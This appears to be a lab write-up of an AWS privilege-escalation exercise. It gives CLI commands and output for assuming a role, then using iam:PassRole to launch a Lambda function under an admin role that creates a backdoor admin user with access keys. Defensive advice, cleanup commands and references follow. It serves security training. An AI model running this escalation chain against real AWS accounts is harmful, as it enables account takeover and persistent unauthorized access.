#### Generated by AI based on Solution_steps.md (in git)

#### Step 1: Configure AWS CLI with chris's credentials

```bash
aws configure --profile chris
aws-switch chris
```

#### Step 2: Verify identity as chris

```bash
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AIDA...",
    "Account": "818310590470",
    "Arn": "arn:aws:iam::818310590470:user/chris-lambda_privesc"
}
```

#### Step 3: Enumerate IAM roles in the account

```bash
aws iam list-roles --query 'Roles[].RoleName' --output json | jq -r '.[]'
```

**Output:**
```
AWSServiceRoleForOrganizations
AWSServiceRoleForResourceExplorer
AWSServiceRoleForSSO
AWSServiceRoleForSupport
AWSServiceRoleForTrustedAdvisor
debug-role-lambda_privesc
lambdaManager-role-lambda_privesc
```

**Key Finding:** Two custom roles exist - `debug-role-lambda_privesc` and `lambdaManager-role-lambda_privesc`

#### Step 4: Check chris's permissions

```bash
aws iam list-attached-user-policies --user-name chris-lambda_privesc --output json
```

**Output:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "chris-policy-lambda_privesc",
            "PolicyArn": "arn:aws:iam::818310590470:policy/chris-policy-lambda_privesc"
        }
    ]
}
```
```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::818310590470:policy/chris-policy-lambda_privesc \
  --version-id v1
  ```
```json
"Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "IAMReadPermissions"
                },
                {
                    "Action": "sts:AssumeRole",
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::818310590470:role/lambdaManager-role-lambda_privesc",
                    "Sid": "AssumeRolePermission"
                }
```
**Key Finding:** Chris has limited permissions (iam:Get*, iam:List*, sts:AssumeRole)

#### Step 5: Investigate the lambdaManager role trust policy

```bash
aws iam get-role --role-name lambdaManager-role-lambda_privesc --query 'Role.AssumeRolePolicyDocument' --output json
```

**Output:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::818310590470:user/chris-lambda_privesc"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

**Key Finding:** Chris can assume the lambdaManager role!

#### Step 6: Investigate the debug role

```bash
aws iam get-role --role-name debug-role-lambda_privesc
```

**Output:**
```json
{
    "Role": {
        "RoleName": "debug-role-lambda_privesc",
        "RoleId": "AROA35BY4WADFHMXTOG7Q",
        "Arn": "arn:aws:iam::818310590470:role/debug-role-lambda_privesc",
        ...
    }
}
```

#### Step 7: Check debug role permissions

```bash
aws iam list-attached-role-policies --role-name debug-role-lambda_privesc
```

**Output:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

**Key Finding:** The debug role has AdministratorAccess !!!!

---

#### Step 8: Assume the lambdaManager role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::818310590470:role/lambdaManager-role-lambda_privesc \
  --role-session-name chris-session
```

**Output:**
```json
{
    "Credentials": {
        "AccessKeyId": "AS...........SEDU",
        "SecretAccessKey": "Ogvfn...........xonrFe9Nbo",
        "SessionToken": "IQoJb3JpZ2..........................KdpGJjCm",
        "Expiration": "2026-02-02T01:23:04+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA35BY4WADAOLX4YCJU:chris-session",
        "Arn": "arn:aws:sts::818310590470:assumed-role/lambdaManager-role-lambda_privesc/chris-session"
    }
}
```

#### Step 9: Export lambdaManager temporary credentials

```bash
export AWS_ACCESS_KEY_ID="ASIA............SEDU"
export AWS_SECRET_ACCESS_KEY="OgvfndGD............xonrFe9Nbo"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2V..................AO2HNKdpGJjCm"
```

#### Step 10: Verify identity as lambdaManager

```bash
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AROA35BY4WADAOLX4YCJU:chris-session",
    "Account": "818310590470",
    "Arn": "arn:aws:sts::818310590470:assumed-role/lambdaManager-role-lambda_privesc/chris-session"
}
```

**Key Finding:** Successfully assumed the lambdaManager role with lambda:* and iam:PassRole permissions

---

### Phase 3: Privilege Escalation via Lambda

#### Step 11: Create malicious Lambda function code and  Package the Lambda function

**lambda.py is in git repo**

```bash
zip lambda_function.zip lambda_function.py
```

#### Step 13: Create Lambda function with the debug role

```bash
aws lambda create-function \
  --function-name chris-privilege-escalation \
  --runtime python3.12 \
  --role arn:aws:iam::818310590470:role/debug-role-lambda_privesc \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://lambda_function.zip \
  --timeout 30
```

**Key Exploitation:** 
- Using `lambda:CreateFunction` permission from lambdaManager role
- Using `iam:PassRole` to assign the admin-privileged debug role to the Lambda function
- The debug role trusts the Lambda service, allowing this assignment

#### Step 14: Invoke the Lambda function

```bash
aws lambda invoke \
  --function-name chris-privilege-escalation \
  response.json

cat response.json
```

**Output (response.json):**
```json
{
    "statusCode": 200,
    "body": "{\"message\": \"Privilege escalation successful!\", \"username\": \"chris-pwned-admin\", \"credentials\": {\"AccessKeyId\": \"AK........2O6I\", \"SecretAccessKey\": \"4ZOo...........reDmlFh\"}}"
}
```

**Key Finding:** Lambda function successfully created admin user with credentials!

---

#### Step 15: Export the new admin credentials

```bash
export AWS_ACCESS_KEY_ID="AKIA.......P6Q2O6I"
export AWS_SECRET_ACCESS_KEY="4ZO..............DmlFh"
unset AWS_SESSION_TOKEN
```

#### Step 16: Verify identity as the new admin user

```bash
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AIDA35BY4WADLLYTM2J7P",
    "Account": "818310590470",
    "Arn": "arn:aws:iam::818310590470:user/chris-pwned-admin"
}
```

#### Step 17: Verify admin privileges

```bash
aws iam list-users
```

**Output:**
```json
{
    "Users": [
        {
            "Path": "/",
            "UserName": "chris-pwned-admin",
            "UserId": "AIDA35BY4WADLLYTM2J7P",
            "Arn": "arn:aws:iam::818310590470:user/chris-pwned-admin",
            "CreateDate": "2026-02-02T01:50:13+00:00"
        },
        {
            "Path": "/",
            "UserName": "chris-lambda_privesc",
            "UserId": "...",
            "Arn": "arn:aws:iam::818310590470:user/chris-lambda_privesc",
            "CreateDate": "..."
        }
    ]
}
```

#### Step 18: Confirm AdministratorAccess policy attachment

```bash
aws iam list-attached-user-policies --user-name chris-pwned-admin
```

**Output:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

**SUCCESS!** Full administrator access achieved! ðŸŽ‰

---

## Attack Chain Summary

```
chris (limited IAM user)
  â”œâ”€ Permissions: iam:Get*, iam:List*, sts:AssumeRole
  â”‚
  â””â”€> Assumes lambdaManager role
       â”œâ”€ Permissions: lambda:*, iam:PassRole
       â”‚
       â””â”€> Creates Lambda function
            â”œâ”€ Assigned role: debug-role-lambda_privesc
            â”œâ”€ Role permissions: AdministratorAccess
            â”‚
            â””â”€> Lambda executes with admin privileges
                 â”‚
                 â””â”€> Creates new admin user: chris-pwned-admin
                      â””â”€ Result: Full administrator access
```

---

## Reflection

### What was your approach?

My approach started with thorough enumeration of IAM resources. I discovered that chris had limited permissions but could assume the lambdaManager role. By investigating the available roles, I found that the debug role had AdministratorAccess and trusted the Lambda service. This led to the realization that I could use the lambdaManager's lambda:* and iam:PassRole permissions to create a Lambda function with the debug role, effectively executing code with admin privileges.

### What was the biggest challenge?

The biggest challenge was understanding the relationship between IAM permissions, role policies, and the PassRole permission. Initially, I explored whether chris could directly assume the debug role, but the  policy only allowed the Lambda service. This required pivoting to use Lambda as an intermediary to leverage the debug role's permissions.

### How did you overcome the challenges?

I carefully with help of AI examined each role's  policy and attached permissions. By mapping out the permission chain (chris â†’ lambdaManager â†’ Lambda with debug role), I identified the privilege escalation path. Testing the Lambda function creation and invocation step-by-step helped verify the exploitation technique worked as expected.


### On the blue side, how can this be defended against?

**Defense Strategies:**

1. **Principle of Least Privilege**
   - Don't attach AdministratorAccess to service roles like Lambda execution roles
   - Grant only the minimum permissions needed for legitimate functions

2. **Restrict iam:PassRole Permission**
   - Limit PassRole to specific roles: `"Resource": "arn:aws:iam::*:role/specific-role-name"`
   - Use condition keys to restrict which roles can be passed to which services

3. **Service Control Policies (SCPs)**
   - Prevent attachment of admin policies at the organization level
   - Block creation of overly permissive roles

4. **Monitoring and Alerting**
   - Set up CloudTrail alerts for:
     - `sts:AssumeRole` events (especially for sensitive roles)
     - `lambda:CreateFunction` with PassRole actions
     - `iam:CreateUser` and `iam:AttachUserPolicy` events
     - Creation of access keys for new users

5. **Role Trust Policy Reviews**
   - Regularly audit which principals can assume which roles
   - Ensure service roles only trust the specific services that need them

6. **Separation of Duties**
   - Don't combine lambda:* and iam:PassRole in the same role
   - Require approval workflows for creating Lambda functions with sensitive roles

7. **IAM Access Analyzer**
   - Use AWS IAM Access Analyzer to identify overly permissive policies
   - Review findings for PassRole permissions

8. **Regular Security Audits**
   - Periodically review all roles with admin privileges
   - Check for unused or unnecessary admin access
   - Validate that service roles follow least privilege

---

## Key Learning Points

1. **PassRole is Powerful**: The `iam:PassRole` permission allows you to assign roles to AWS services, which can lead to privilege escalation if combined with service creation permissions.

2. **Trust Policies Matter**: Understanding which principals can assume which roles is critical for both offense and defense.

3. **Service-Based Pivoting**: Even if you can't directly assume an admin role, you may be able to leverage AWS services (Lambda, EC2, Glue, etc.) as intermediaries.

4. **Defense in Depth**: Multiple defensive layers (least privilege, monitoring, SCPs, trust policies) are needed to prevent privilege escalation attacks.

5. **Enumeration is Key**: Thorough reconnaissance of IAM permissions, roles, and trust relationships is essential for identifying privilege escalation paths.

---

## Cleanup Commands

```bash
# Delete the Lambda function
aws lambda delete-function --function-name chris-privilege-escalation

# Delete the pwned admin user
aws iam detach-user-policy \
  --user-name chris-pwned-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam delete-access-key \
  --user-name chris-pwned-admin \
  --access-key-id AKIA3...........O6I

aws iam delete-user --user-name chris-pwned-admin

# Destroy all Terraform resources
terraform destroy
```

---

## References

- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)
- [Lambda Execution Roles](https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [CloudTrail Event Reference](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html)
